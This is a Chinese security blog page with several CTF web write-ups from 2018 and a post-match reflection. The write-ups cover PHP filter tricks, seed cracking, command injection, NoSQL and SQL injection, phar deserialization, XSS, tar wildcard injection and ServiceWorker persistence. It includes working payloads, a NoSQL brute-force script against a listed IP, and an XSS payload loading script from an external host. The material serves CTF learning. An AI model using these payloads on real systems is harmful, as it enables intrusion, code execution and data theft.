<p>这也提醒我们,正确使用preg_match的重要性，用强类型等于避免很多不安全因素</p>
<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>这个题真的发现很多知识碎片</p>
<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>首先聊聊filter的妙用。以前见到的情况和套路都是include()、file_get_contents()的参数可控，我们用php://filter/read配合base64-encode可以把文件编码成base64后输出。没想到file_put_contents文件名可控时也有magic</p>
<p>当我们可控的文件名$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，$text传入<code>this is test</code>时，file_put_contents($file,$text)执行的内容如下：<br><img src="https://s1.ax1x.com/2018/12/24/F6Hv60.png" alt></p>
<p>可以把写入的文本进行base64编码，而且可以指定写入的文件名<code>shell.php</code>。其实这个用处还挺多的，比如将可控文本Base64编码，用伪协议写入文件的时候再decode，就能绕过<strong>后端正则对可控文本php危险语句检测</strong>的过滤</p>
<h2 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h2><p>关键代码<br><img src="https://s1.ax1x.com/2018/12/24/F6bp0U.png" alt></p>
<p>$output会被转义后输入到可控文本，用上面的思路在写入文本的时候base64-decode就能绕过，注意用Host拼接$log_name。</p>
<p>至于绕过后缀名，这两天做工程实践的时候恰好用到了p师傅关于apache的x0a后缀解析为php的文件上传绕过，具体思路：<a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a><br><img src="https://s1.ax1x.com/2018/12/24/F6bE11.png" alt></p>
<p>poc如下<br><img src="https://s1.ax1x.com/2018/12/24/F6b97F.png" alt></p>
<h1 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h1><p>这道题依然简单粗暴，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>刚开始不清楚正则里(?R)的用法，看了别人的WP才知道这是PCRE的正则递归。在这道题里，就是按照递归的方式一直匹配<code>/[^\W]+\((?R)?\)/</code>，看下面这个例子<br><img src="https://i.loli.net/2019/01/08/5c3412a2631a6.jpg" alt></p>
<p>在匹配完b()之后，由于匹配不到[^\W]，正则就停止了。所以这里的代码执行点就是：嵌套函数且最后一个函数不能用参数值</p>
<p>有的师傅们用了get_defined_vars()获取http请求头。其实这个之前在打awd时上流量监控部分用到过，appache可以用getallheaders()来获取http头，但是nginx没有这个函数，可以用了get_defined_vars()，通过current()、next()进而选择可控参数,poc如下</p>
<p><img src="https://i.loli.net/2019/01/08/5c3413c0a9be1.png" alt></p>
<h1 id="Nodejs魔法"><a href="#Nodejs魔法" class="headerlink" title="Nodejs魔法"></a>Nodejs魔法</h1><p>Koa框架写的登陆页面，入库的语句都写出来了<br><img src="https://i.loli.net/2018/12/02/5c033d7cc5c7a.png" alt></p>
<p>看到这一步很关键，因为忘了看flag在哪个表里，后面浪费了很多时间</p>
<p>继续看到登陆的逻辑<br><img src="https://i.loli.net/2018/12/02/5c033d7ce1b2e.png" alt><br>传入的username&amp;&amp;password非空，并且经过safe函数过滤后带入查询，如果有结果则设定session为查询结果</p>
<p>##分析<br>一开始绕safe就饶了好久,尝试了各种注释。最后l0cal师傅提醒，在js里toUpperCase()是可以用拉丁文的unicode绕过的，例如<code>&quot;ſ&quot;.toUpperCase()&lt;=&gt;&quot;S&quot;</code>和<code>&quot;ı&quot;.toUpperCase()&lt;=&gt;&quot;I&quot;</code></p>
<p>那么select 和 union 都可以绕过</p>
<p>一开始想多了,一直在盲注,根据时候有session判断查询的真假，结果好多东西都绕不过去，而且没看代码还在傻乎乎的测表名，十分愚蠢</p>
<p>有好多语句都会500，估计是云服务做了限制。。到最后发现把用户名和密码置空，后面用union查询flag，那设置的session不就是flag么。。</p>
<p>真的是太菜了</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/20/SWPUCTF2018 Write up/"> 
                    SWPUCTF2018 Write up 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-20   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
            </div>
            <div class="content">
                
                <p>恰逢复习期，也没什么事，打一场SWPUCTF来放松一下，感谢西油出题师傅。最后狗了个第十二名，顺便吐槽一下队友起的什么智障名字。。<br><img src="https://i.loli.net/2018/12/20/5c1b02a394512.png" alt></p>
<h1 id="SWPUCTF2018"><a href="#SWPUCTF2018" class="headerlink" title="SWPUCTF2018"></a>SWPUCTF2018</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="PCAP"><a href="#PCAP" class="headerlink" title="PCAP"></a>PCAP</h2><p>签到题，流量包拖wireshark追TCP包</p>
<h2 id="床前明月光-低头…"><a href="#床前明月光-低头…" class="headerlink" title="床前明月光,低头…"></a>床前明月光,低头…</h2><p>低头看键盘</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure>

<p>键盘密码 99就代表9那列的第二个值</p>
<p>look ….. 依次读就行了</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="用优惠码买个X"><a href="#用优惠码买个X" class="headerlink" title="用优惠码买个X"></a>用优惠码买个X</h2><p>拿到题目扫目录 <a href="http://www.zip" target="_blank" rel="noopener">www.zip</a><br>源码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;seed&apos;]=rand(0,999999999);</span><br><span class="line">function youhuima()&#123;</span><br><span class="line">	mt_srand($_SESSION[&apos;seed&apos;]);</span><br><span class="line">    $str_rand = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">    $auth=&apos;&apos;;</span><br><span class="line">    $len=15;</span><br><span class="line">    for ( $i = 0; $i &lt; $len; $i++ )&#123;</span><br><span class="line">        if($i&lt;=($len/2))</span><br><span class="line">              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);</span><br><span class="line">        else</span><br><span class="line">              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);</span><br><span class="line">    &#125;</span><br><span class="line">    setcookie(&apos;Auth&apos;, $auth);</span><br><span class="line">&#125;</span><br><span class="line">//support</span><br><span class="line">	if (preg_match(&quot;/^\d+\.\d+\.\d+\.\d+$/im&quot;,$ip))&#123;</span><br><span class="line">        if (!preg_match(&quot;/\?|flag|&#125;|cat|echo|\*/i&quot;,$ip))&#123;</span><br><span class="line">               //执行命令</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">              //flag字段和某些字符被过滤!</span><br><span class="line">        &#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">             // 你的输入不正确!</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>根据提示应该分两部分  绕过优惠码-&gt;命令执行逃过</p>
<p>首先说破解优惠码，登陆时session产生0-99999999随机数为种子，通过mt_srand()种下随机数种子，mt_rand()来获取这个随机数。</p>
<p>这里mt_srand伪随机，具体机制可以看这篇文章：<a href="http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF" target="_blank" rel="noopener">http://wonderkun.cc/index.html/?p=585%EF%BC%8C%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E4%B9%9F%E6%98%AFctf%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF</a></p>
<p>种子不变，生成的随机数就不变</p>
<p>所以通过前15位随机数，破解种子，根据种子再生成24位的随机数，也就是我们的优惠码</p>
<p>脚本跑随机数在字符串的位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;lP9DUJjQ&quot;;</span><br><span class="line">$randStr = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line"> </span><br><span class="line">for($i=0;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">   $pos = strpos($randStr,$str[$i]);</span><br><span class="line">   echo $pos.&quot; &quot;.$pos.&quot; &quot;.&quot;0 &quot;.(strlen($randStr)-1).&quot; &quot;;</span><br><span class="line">   //整理成方便 php_mt_seed 测试的格式</span><br><span class="line">  //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个的坑点，必须跑前八位优惠码，因为算法里后起位和前八位生成顺序不一样</p>
<p>用工具php_mt_seed跑一下<br><img src="https://i.loli.net/2018/12/20/5c1af5f2cb05b.png" alt></p>
<p>本地php7环境跑这个种子的24位就能得到优惠码了</p>
<p>优惠码成功跳转到命令执行whois查询，匹配ip时用了/m  且^ $必须匹配头尾，%0a换行绕过检测，0a后面写规范ip</p>
<p>过滤了查询flag的语句，用”” 或者\绕过都行</p>
<p>完整payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ca\t /f\lag%0a127.0.0.1</span><br></pre></td></tr></table></figure>

<h2 id="Injection"><a href="#Injection" class="headerlink" title="Injection ???"></a>Injection ???</h2><p>扫目录用个info.php</p>
<p>是个phpinfo然后拓展显示mongo的数据库，搭配题目叫注入，那应该是一个nosql注入了</p>
<p>思路很简单，用通配符猜解admin的密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&amp;password[$regex]=^**</span><br></pre></td></tr></table></figure>

<p>只不过要写个脚本跑验证码，这里队友写了一个提供参考</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import pytesseract</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">from urllib.request import urlretrieve</span><br><span class="line"></span><br><span class="line">j=0</span><br><span class="line">passw0rd = [&quot;s&quot;,&quot;k&quot;,&quot;m&quot;,&quot;u&quot;,&quot;n&quot;]</span><br><span class="line">payload=&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890_!@#$%&quot;</span><br><span class="line">url = &quot;http://123.206.213.66:45678/check.php?username=admin&amp;password[$regex]=^skmun&#123;&#125;&amp;vertify=&#123;&#125;&quot;</span><br><span class="line">img_url = &apos;http://123.206.213.66:45678/vertify.php&apos;</span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">	while j&lt;len(payload):</span><br><span class="line">		s = requests.session()</span><br><span class="line">		payloads = payload[j]</span><br><span class="line">		with open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;,&apos;wb&apos;) as fd:</span><br><span class="line">			img_1 = s.get(url=img_url)</span><br><span class="line">			fd.write(img_1.content)</span><br><span class="line">		image = Image.open(r&apos;C:\Users\asus\Desktop\image\img1.png&apos;)</span><br><span class="line">		vcode = pytesseract.image_to_string(image)</span><br><span class="line">		url_1 = url.format(str(payloads),vcode)</span><br><span class="line">		r = s.get(url_1,cookies=img_1.cookies)</span><br><span class="line">		print(r.text)</span><br><span class="line">		if &quot;wrong CAPTCHA!&quot; in r.text:</span><br><span class="line">			continue</span><br><span class="line">		if &quot;username or password incorrect!&quot; in r.text:</span><br><span class="line">			print(payloads)</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br><span class="line">		if &quot;Nice!But it is not the real passwd&quot; in r.text:</span><br><span class="line">			passw0rd.append(payloads)</span><br><span class="line">			print(&quot;passw0rd is :&quot; + str(passw0rd))</span><br><span class="line">			j = j+1</span><br><span class="line">			break</span><br></pre></td></tr></table></figure>

<h2 id="SimplePHP"><a href="#SimplePHP" class="headerlink" title="SimplePHP"></a>SimplePHP</h2><p>题目地址：</p>
<p>file有个代码高亮的功能，把这些页面的额源码都Down一下</p>
<p>先看一下test类的__get()方法<br><img src="https://i.loli.net/2019/01/17/5c4024d7a5bbf.png" alt><br><img src="https://i.loli.net/2019/01/17/5c4024d7a663a.png" alt></p>
<p>__get()方法用于输出一个不可访问变量的值，<strong>不可访问不仅仅是protected和private，还有不存在的变量也属于不可访问，这点很重要</strong>。$key的值就是不可访问的参数名，这里是”source”，如果输入”xx”，echo的就是xx。</p>
<p>开发角度来讲，私有属性一般都会调用__get()方法用以提供外界访问。继续看下面的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public function get($key)</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">        $value = $this-&gt;params[$key];      </span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $value = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    return $this-&gt;file_get($value);  </span><br><span class="line">&#125;</span><br><span class="line">public function file_get($value)</span><br><span class="line">&#123;</span><br><span class="line">    $text = base64_encode(file_get_contents($value));</span><br><span class="line">    return $text;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过调用get()方法获取params数组里的值，进而获取这个值所对应的文件内容，这为获取flag文件内容做了铺垫。</p>
<p>所以只需要想办法使$this-&gt;params[$key] =  ‘/var/www/html/f1ag.php’</p>
<h3 id="瓶颈"><a href="#瓶颈" class="headerlink" title="瓶颈"></a>瓶颈</h3><p>一开始我是这样构造的攻击链：<br><img src="https://i.loli.net/2018/12/20/5c1b0f967a20a.png" alt></p>
<p>之前分析过phar，它在反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上</p>
<p>但是这里有一个问题，phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。那么就开始下面的方法：</p>
<h3 id="正确的思路"><a href="#正确的思路" class="headerlink" title="正确的思路"></a>正确的思路</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$a = new Test();</span><br><span class="line">$a-&gt;params = [</span><br><span class="line">    &apos;source&apos; =&gt; &apos;/var/www/html/f1ag.php&apos;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">$b = new Show();</span><br><span class="line">$b-&gt;str[&apos;str&apos;] = $a;</span><br><span class="line"></span><br><span class="line">$c = new C1e4r();</span><br><span class="line">$c-&gt;str = $b;</span><br></pre></td></tr></table></figure>

<p>思路就是：<br>我们用test类来获取f1ag.php里的内容，返回给$content(Show类)，$content的值再返回给C1e4r类的echo输出</p>
<p>C1e4r调用echo，而echo可以执行toString方法，所以我们让echo的值为我们要控的toString方法对应的类即show类的对象</p>
<h2 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h2><p>网站功能很少：提交邮箱地址-&gt;管理审核邮箱</p>
<p>给了hint:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--check.php</span><br><span class="line">if($_POST[&apos;email&apos;]) &#123;</span><br><span class="line">$email = $_POST[&apos;email&apos;];</span><br><span class="line">if(!filter_var($email,FILTER_VALIDATE_EMAIL))&#123;</span><br><span class="line">echo &quot;error email, pleduase check your email&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;等待管理员自动审核&quot;;edit/5c1a5a3a38649f668227c9fd</span><br><span class="line">echo $email;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>之前有个红日审计项目，关于filter_var()匹配email的漏洞进行了剖析:<a href="https://xz.aliyun.com/t/2501" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501</a></p>
<p>大致就是单引号双引号重叠，用\可以绕过空格，</p>
<p>然后我尝试了一下注入scirpt标签提交..尼玛直接成功了…<br><img src="https://i.loli.net/2018/12/20/5c1af8b853c84.jpg" alt></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=&quot;\ &lt;sCRiPt\ sRC=https://unazizi.exeye.io/swctf&gt;&lt;/sCrIpT&gt;\ &quot;@aa.com</span><br></pre></td></tr></table></figure>

<p>那它的意思应该是后台管理员会随时点击这个email，就触发了xss</p>
<p>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="https://i.loli.net/2018/12/20/5c1af977078cf.jpg" alt></p>
<p>发现后台会跳到：<code>/admin/a0a.php?cmd=whoami</code></p>
<p>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p>
<p>后台Bot一直会请求admin.php这个页面，xss 改变它请求的参数，让本地管理员帮我们执行这个命令</p>
<p>用XHR发送请求或者Location重定向都可以</p>
<p>反弹Shell后发现还有题目，后台有个上传页面和备份页面，其中backup.php可读内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(&quot;upload.php&quot;);</span><br><span class="line">echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">$sys = &quot;tar -czf z.tar.gz *&quot;;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line">if(file_exists(&apos;z.tar.gz&apos;))&#123;</span><br><span class="line">        echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;</span><br><span class="line">        echo &quot;备份文件名: z.tar.gz&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">        echo &quot;未上传文件，无法备份！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>也就是说它会备份我们上传目录下的所有文件，即*</p>
<p>上传一些文件名例如<code>| echo &quot;123&quot;&gt;123.php</code></p>
<p>System 就会执行拼接后的$sys</p>
<p>当时题目坏了，出题师傅跟我说直接再弹一个shell，就可以拿到flag权限。。</p>
<p>然后直接给我了flag…2333…</p>
<h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>这次比赛是西南石油师傅举办的公益性比赛..觉得他们确实挺不容易的，学院不支持+自掏腰包办比赛，但是赛题质量都还不错，可见师傅们的用心，给个好评！</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/20/SWPUCTF2018 Write up/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/12/17/HCTF2018线下赛感想/"> 
                    HCTF2018线下赛感想 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-12-17   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/博客文章/">博客文章</a></li></ul>
            </div>
            <div class="content">
                
                <p>跑去丢了一趟人，实在是对不起各位师傅</p>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><p>比赛期恰逢考试期，几天一共就睡了几个小时，无论从体力或是经验都输的一塌糊涂。</p>
<p>这次比赛也算是给自己个教训，<strong>准备不充分</strong>，就把之前备好的流量成功监控了，其余的东西几乎没用</p>
<p>比赛开始配置网络用了挺长时间的，导致登上ssh以后就已经被别人上马了。</p>
<p>其实这是很吃亏的事：第一，你无法及时备份原始的目录，这就有一个很严重的后果，如果后来一不小心恢复了留有马子的备份一切功亏一篑，更严重的是，如果你的一些服务被恶意删了，那开局就直接崩盘。</p>
<p>第二，在你杀别人后门的时候，别人可能就已经打了你一轮，甚至可能会种新的马。而且杀后门的时间又占用了补洞的时间..新一轮的马子又会上来…</p>
<p>所以上线一定要快，备份打的一定要快！</p>
<p>教训就是，一定要在本地补好洞了，再传到机器上，宁可被打，也要修好自己的服务，被打总比down掉了好。这次吃了很大的亏，全场被check。</p>
<p>所以，不要随便就删漏洞点，有时候漏洞点也是功能点。补洞不代表无脑卡权限，这次include的文件包含洞就可以换成file_get_contents来补。<strong>最重要的事，不要随便就把目录555了</strong>，如果Check点是上传和下载功能就凉了</p>
<p>关于防御，<strong>一定要给自己留一个可用的后门</strong>,www-data权限一定得有一个，否则php进程可能都杀不掉</p>
<h1 id="这次比赛后要准备的东西"><a href="#这次比赛后要准备的东西" class="headerlink" title="这次比赛后要准备的东西"></a>这次比赛后要准备的东西</h1><p>吃足了教训：<strong>手动上马是非常愚蠢的行为</strong></p>
<h2 id="内置后门批量上马"><a href="#内置后门批量上马" class="headerlink" title="内置后门批量上马"></a>内置后门批量上马</h2><p>蓝莲花的moxiaoxi师傅的脚本思路大致是这样的：</p>
<p>内置后门(能执行system函数)，通过散列生成随机名字的隐藏不死马+守护进程维护不死马+软连接来隐藏真实的请求</p>
<p>最近要完成这个脚本</p>
<h2 id="心态"><a href="#心态" class="headerlink" title="心态"></a>心态</h2><p>心态真的是很重要，不要因为被打就慌张，找到洞点，补好了再上服务，切忌慌里慌张。</p>
<p>这次就算是交学费了，自闭</p>

                
            </div>
            <div class="continue">
            <a href="/2018/12/17/HCTF2018线下赛感想/">
            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
            </a>
            </div>
        </article>
        
        <article class="post">
            <h1>
                <a class="title" href="/2018/11/14/RootkitXSS֮ServiceWorker/"> 
                    RootkitXSS之ServiceWorker 
                </a>
            </h1>
                        <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-11-14   
                </a>
                
                
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS测试/">XSS测试</a></li></ul>
            </div>
            <div class="content">
                
                <h1 id="RootkitXSS之ServiceWorker"><a href="#RootkitXSS之ServiceWorker" class="headerlink" title="RootkitXSS之ServiceWorker"></a>RootkitXSS之ServiceWorker</h1><p>文章首发于先知：<a href="https://xz.aliyun.com/t/3228#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/3228#toc-10</a></p>
<p>在拿到一个可以XSS点的时候后，持久化成为一种问题。这几天跟师傅们接触到RootkiXss的一些姿势，受益匪浅</p>
<h2 id="Serviceworker定义"><a href="#Serviceworker定义" class="headerlink" title="Serviceworker定义"></a>Serviceworker定义</h2><p>Service workers(后文称SW) 本质上充当Web应用程序与浏览器之间的代理服务器，也可以在网络可用时作为浏览器和网络间的代理。它们旨在（除其他之外）使得能够创建有效的离线体验，拦截网络请求并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。他们还允许访问推送通知和后台同步API。</p>
<p>也就是说SW 提供了一组API，能够拦截当前站点产生HTTP请求，还能控制返回结果。因此，SW 拦住请求后，使用 Cache Storage 里的内容进行返回，就可以实现离线缓存的功能。当Cache Storage不存在请求的资源时再向服务器请求,cache.put可以选择性地将请求资源加载到cache storage中。如果不手动取消已经注册过的sw服务,刷新/重新打开页面都会启动站点的sw服务，这为我们持久化XSS提供了一定的条件。</p>
<h3 id="查看SW服务"><a href="#查看SW服务" class="headerlink" title="查看SW服务"></a>查看SW服务</h3><p>Chrome地址栏访问 chrome://serviceworker-internals/，就可以看见已有的后台服务。</p>
<h2 id="注册serviceworker"><a href="#注册serviceworker" class="headerlink" title="注册serviceworker"></a>注册serviceworker</h2><p>注册点js代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	var url=&quot;//localhost/serviceworker.js&quot;;</span><br><span class="line">	if (&apos;serviceWorker&apos; in navigator) &#123;</span><br><span class="line"> navigator.serviceWorker.register(url)</span><br><span class="line"> .then(function(registration) &#123;</span><br><span class="line"> console.log(&apos;ServiceWorker registration successful with scope: &apos;, registration.scope);</span><br><span class="line"> &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">normal visit</span><br></pre></td></tr></table></figure>

<p>script标签下的type必须指明为<code>text/javascript</code></p>
<h3 id="event-request-clone"><a href="#event-request-clone" class="headerlink" title="event.request.clone()"></a>event.request.clone()</h3><p>对象的内容如图<br><img src="https://i.loli.net/2018/11/03/5bdd0e7b665f4.png" alt></p>
<h2 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h2><h3 id="一个可以XSS的点"><a href="#一个可以XSS的点" class="headerlink" title="一个可以XSS的点"></a>一个可以XSS的点</h3><h3 id="sw文件可控"><a href="#sw文件可控" class="headerlink" title="sw文件可控"></a>sw文件可控</h3><p>如果说sw可以放在同源下,也就是js文件可控的话。直接注册Sw，代码如下：</p>
